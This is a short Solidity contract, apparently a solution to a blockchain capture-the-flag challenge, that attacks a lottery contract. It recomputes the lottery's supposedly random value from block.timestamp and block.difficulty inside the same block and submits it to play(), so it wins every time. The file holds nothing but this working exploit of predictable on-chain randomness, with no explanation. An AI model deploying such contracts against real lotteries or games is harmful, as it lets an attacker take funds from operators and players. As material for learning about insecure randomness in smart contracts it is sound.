//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.6;

interface ILottery {
	function play(uint256 candidate) external;
}

contract MyContract {
  function callMe(address addr)
		external
  {
	  ILottery lot = ILottery(addr);
	  uint256 h = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)));
		lot.play(h);
  }
}
